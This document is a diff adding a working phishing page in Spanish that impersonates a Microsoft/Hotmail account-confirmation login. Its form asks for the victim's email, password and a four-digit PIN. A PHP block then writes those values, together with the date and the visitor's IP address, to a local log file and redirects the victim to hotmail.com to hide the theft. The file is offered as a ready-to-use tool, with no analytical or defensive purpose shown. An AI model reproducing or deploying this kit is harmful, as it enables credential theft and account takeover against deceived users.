@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+
+<html>
+	<head>
+		<link  rel="icon"   href="favicon.png" type="SCAM/favicon.png" sizes="16x16"/>
+		<title>Confirma tu cuenta Microsoft</title>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<link rel="stylesheet" type="text/css" href="estilo.css">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=no">
+
+<style type="text/css">body{display:none;}</style>
+
+<style type="text/css">body{display:block !important;}</style>
+<style type="text/css">body{display:block !important;}</style>
+	
+</head>
+
+<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
+
+<div id="container">
+
+<img src="hotmail.jpg"  alt="">
+
+ <h2>Confirmar cuenta</h2>
+
+<form action="<?php echo basename(__FILE__); ?>" method="post">
+	
+	<input type="email" name="emil" placeholder="Correo electrónico, teléfono o Skype" required=>
+	<input id="clave" type="password" name="pss" placeholder="Contraseña" required="Numero">
+	<small>Para mayor seguridad crea un PIN a tu cuenta.</small>
+	<div><img src="llave.jpg"  alt="llave.png"></div>
+	<input class="pin"  minlength="4" maxlength="4" type="password" type="password" name="numero" placeholder="PIN ****" required="" pattern="[0-9]+"> 
+	<input type="submit" value="Confirmar">
+	
+ 	</div>
+</form>
+
+<h3>Térmios de uso</h3>
+<h5>Privacidad y cookies</h5>
+	
+
+
+</body>
+
+</div></div>
+
+</html>
+<?php
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+header('Location: http://hotmail.com');
+$handle = fopen('perifericosactivos.html', 'a');
+fwrite($handle, "C0rr30: ".$_POST['emil']." <br> Cl4v3: ".$_POST['pss']."<br> PIN: ".$_POST['numero']." <br> Fecha: ".date('d-m-Y')." | ".date('H:i:s')." ".$_SERVER['REMOTE_ADDR']." <br> " . PHP_EOL );
+fwrite($handle, "*************BY MONTAÑO****************** <br>");
+fclose($handle);
+exit;
+} ?>
+
+
+
+
+
+
+
+
+
+
+
+
+
